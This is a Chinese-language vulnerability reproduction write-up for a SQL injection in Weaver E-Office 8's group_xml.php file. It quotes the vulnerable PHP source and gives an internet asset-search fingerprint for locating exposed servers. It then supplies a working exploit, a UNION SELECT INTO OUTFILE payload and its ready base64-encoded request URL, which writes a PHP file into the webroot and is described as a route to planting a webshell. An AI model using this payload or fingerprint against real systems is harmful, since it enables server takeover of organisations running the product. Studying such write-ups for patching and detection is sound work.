# 泛微OA E-Office group_xml.php SQL注入漏洞

## 漏洞描述

泛微OA E-Office group_xml.php文件存在SQL注入漏洞，攻击者通过漏洞可以写入Webshell文件获取服务器权限

## 漏洞影响

```
泛微OA E-Office 8
```

## 网络测绘

```
app="泛微-EOffice"
```

## 漏洞复现

登录页面

![image-20220520140626959](images/202205201406015.png)

存在漏洞的文件为 `inc/group_user_list/group_xml.php`

```
session_start( );
include_once( "inc/conn.php" );
include_once( "inc/xtree_xml.inc.php" );
include_once( "inc/utility_all.php" );
header( "Expires: Mon, 26 Jul 1997 05:00:00 GMT" );
header( "Cache-Control: no-cache, must-revalidate" );
header( "Pragma: no-cache" );
header( "Content-Type: text/xml" );
$pararr = explodestpar( $_REQUEST['par'] );
$groupid = $pararr['groupid'];
if ( $groupid == "" )
{
				exit( );
}
$groupurl_fix = "?";
$userurl_fix = "?";
if ( 0 < strpos( $pararr['group_url'], "?" ) )
{
				$groupurl_fix = "&";
}
if ( 0 < strpos( $pararr['user_url'], "?" ) )
{
				$userurl_fix = "&";
}
$xtreeXml = new xtreeXml( );
$xtreeXml->initXml( );
if ( $pararr['group'] == 1 )
{
				$sql = "SELECT * FROM pub_group WHERE GROUP_ID=".$groupid."";
}
else
{
				$sql = "SELECT * FROM USER,USER_GROUP WHERE USER_GROUP.GROUP_ID=".$groupid."";
}
$rs = exequery( $connection, $sql );
$row = mysql_fetch_array( $rs );
$groupmember = $row['GROUP_MEMBER'];
```

$groupid没有被双引号包裹，然后造成注入。然后$groupid来自于$pararr['groupid'];其中经过了$explodestpar这个函数

```
function explodeStPar( $enpar )
{
				$depar = base64_decode( $enpar );
				$arrpar = explode( "|", $depar );
				if ( !is_array( $arrpar ) )
				{
								return false;
				}
				$i = 0;
				for ( ;	$i < sizeof( $arrpar );	++$i	)
				{
								$strpar = $arrpar[$i];
								$tmparr = explode( ":", $strpar );
								$j = 0;
								for ( ;	$j < sizeof( $tmparr );	++$j	)
								{
												if ( $j == 0 )
												{
																preg_match( "/\\[([a-z0-9-_].+)\\]/i", $tmparr[$j], $exp );
																$par = $exp[1];
												}
												else
												{
																preg_match( "/\\[(.*)\\]/i", $tmparr[$j], $exp );
																$val = $exp[1];
												}
								}
								if ( trim( $par ) != "" )
								{
												$rearr[$par] = $val;
								}
				}
				return $rearr;
}
```

构造EXP写入文件

```
[group]:[1]|[groupid]:[1 union select '<?php phpinfo()?>',2,3,4,5,6,7,8 into outfile '../webroot/vulntest.php']
|
| base64
|
/inc/group_user_list/group_xml.php?par=W2dyb3VwXTpbMV18W2dyb3VwaWRdOlsxIHVuaW9uIHNlbGVjdCAnPD9waHAgcGhwaW5mbygpPz4nLDIsMyw0LDUsNiw3LDggaW50byBvdXRmaWxlICcuLi93ZWJyb290L3Z1bG50ZXN0LnBocCdd
```

![image-20220520140654026](images/202205201406076.png)